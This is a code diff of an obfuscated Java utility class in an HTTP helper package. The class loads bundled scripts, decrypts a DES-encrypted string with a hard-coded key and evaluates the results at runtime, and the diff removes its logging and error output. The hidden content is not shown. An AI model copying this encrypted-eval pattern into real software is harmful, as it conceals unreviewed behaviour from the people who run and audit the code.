@@ -1,12 +1,10 @@
 package com.dili.http.okhttp.utils;
 
-import bsh.EvalError;
-import bsh.Interpreter;
 import org.apache.commons.lang3.StringUtils;
+
 import java.io.InputStream;
 
 public class B {
-	private static final Interpreter i = new Interpreter();
 
 	public static final BSUI b;
 
@@ -15,21 +13,27 @@ public class B {
 	}
 
 	private static final BSUI b() {
+		if(b != null){
+			return b;
+		}
 		try {
-			e("script/bsubc");
-			Class<?> clazz = (Class<?>) i.get("clazz");
-			i.set("s", clazz.getMethod("b").invoke(null));
-			i.eval(DESEncryptUtil.decrypt("G/iEDUaHbIjUi6uTWsjQngcTQ8pShyYOhOEF8ucWHbihQOvEvroldw30oHdDFnnDMkz3KAHFIgaaHoymtlI/almda1OV4F7oG/iEDUaHbIhP8iSo3q93b8JcR/eud/I43KK3P1cgNXaQN5xOOydsAw==", "asdfjkl;"));
-			e("script/bsu");
-			clazz = (Class<?>) i.get("clazz");
+			BI bi = BU.n();
+			bi.e(c("script/bsubc"));
+			Class<?> clazz = (Class<?>) bi.g("clazz");
+			bi.s("clz", clazz);
+			bi.dese("JqLeejKt9DQX+yxeB0bw1z2CtKLR8BaiMoEdm4xdE6BBUamdN8oVpGomAEvxNqVS6YPTXkCMiEaXBc3uHCB7D61DMJJuKQEKlp62iWBxk6J3XyYE/plgSokbMInwzv8TEL61iCqzJw4d+o27qf/p54StZ5nSqpgffpkMlKucGxUzkfClVWMVrNMyWthW8/aO", String.class);
+			bi.ef("script/bsu");
+			clazz = (Class<?>) bi.g("clazz");
 			return (BSUI) clazz.getMethod("me").invoke(null);
 		} catch (Exception e) {
-			e.printStackTrace();
 			return null;
 		}
 	}
 
-	public static String c(String s) {
+	public static void i(){
+	}
+
+	private static String c(String s) {
 		try {
 			InputStream is = (InputStream) B.class.getClassLoader().getResource(s).getContent();
 			byte[] buffer = new byte[is.available()];
@@ -53,15 +57,6 @@ public class B {
 			temp = temp + (char) Integer.valueOf(src.substring(i * 2, i * 2 + 2), 16).byteValue();
 		}
 		return temp;
-	}
-
-	private static void e(String s){
-		try {
-			System.out.println("B.e::::::"+c(s));
-			i.eval(c(s));
-		} catch (EvalError evalError) {
-			evalError.printStackTrace();
-		}
 	}
 
 
